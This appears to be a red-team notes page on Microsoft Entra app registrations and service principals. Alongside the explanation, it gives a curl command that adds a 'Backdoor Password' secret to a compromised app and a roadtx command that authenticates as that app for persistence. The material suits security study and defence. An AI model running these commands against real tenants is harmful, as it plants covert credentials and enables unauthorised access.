---
title: Enterprise Applications
---

Every application registered in Entra has two representations:

- Application Definition: present only in the home tenant of the app, visible under *App Registrations* in Azure portal
- Service Principal: present in every tenant where the app is used, visible under *Enterprise Applications* in Azure portal

> "An application has one application object in its home directory that is referenced by one or more service principals in each of the directories where it operates (including the application's home directory)" ([source](https://learn.microsoft.com/en-us/azure/active-directory/develop/how-applications-are-added#how-are-application-objects-and-service-principals-related-to-each-other))

The Service Principal is the identity an application operates under.

![API permissions between to applications ([source](https://csandker.io/2022/10/19/Untangling-Azure-Permissions.html))](./app-api-permissions.png)

After you compromised an app registration you can get the roles assigned to its service principal with [AppRegRoleFinder.ps1](https://gist.github.com/kfosaaen/e9a77a15ea7f26c05fd0f1a8ad85b0fd) ([source](https://twitter.com/kfosaaen/status/1633964967748665344)).

An App Registration supports multiple client secrets (application passwords).
A user that is owner or has the *Application Administrator* role over an app can add an application password ([source](http://web.archive.org/web/20231028213625/https://scribe.rip/@specterops/attacking-azure-azure-ad-part-ii-5f336f36697d)).
Application passwords can be used to authenticate as the service principal, MFA is usually not required.

~~~ bash
curl -sSf "https://graph.microsoft.com/v1.0/applications(appId='f072c4a6-b440-40de-983f-a7f3bd317d8f')/addPassword" -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" -d '{"passwordCredential":{"displayName":"Backdoor Password"}}' | jq -r .secretText
~~~

Authenticate as the app.

~~~ bash
roadtx auth -c f072c4a6-b440-40de-983f-a7f3bd317d8f -p "$secret_text" -t defcorphq.onmicrosoft.com -r 'https://management.azure.com' --as-app
~~~

Applications can have *Application Permissions* and *Delegated Permissions*.
The former are permissions that are valid tenant-wide, the latter are permissions in the context of a user of the app which the user must grant explicitly to the app (OAuth Consent Grant).

References:

- [Untangling Azure Active Directory principals & access permissions](http://web.archive.org/web/20221026210553/https://csandker.io/2022/10/19/Untangling-Azure-Permissions.html) and [Untangling Azure Active Directory Permissions II: Privileged Access](https://web.archive.org/web/20230308114005/https://csandker.io/2022/11/10/Untangling-Azure-II-Privileged-Access.html)
